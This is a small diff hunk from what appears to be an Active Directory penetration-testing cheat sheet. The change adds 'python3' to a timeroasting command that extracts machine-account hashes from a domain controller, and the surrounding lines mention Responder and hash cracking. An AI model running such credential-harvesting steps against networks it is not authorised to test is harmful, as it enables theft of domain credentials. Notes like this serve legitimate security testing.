@@ -105,7 +105,7 @@ Check Responder after a few minutes, then crack the NTLMv2 hash
 
 Do a timeroasting attack to extract hashes from machine accounts
 
-    sudo timeroast.py DC_IP | tee ntp-hashes.txt
+    sudo python3 timeroast.py DC_IP | tee ntp-hashes.txt
 
 Crack hashes
 
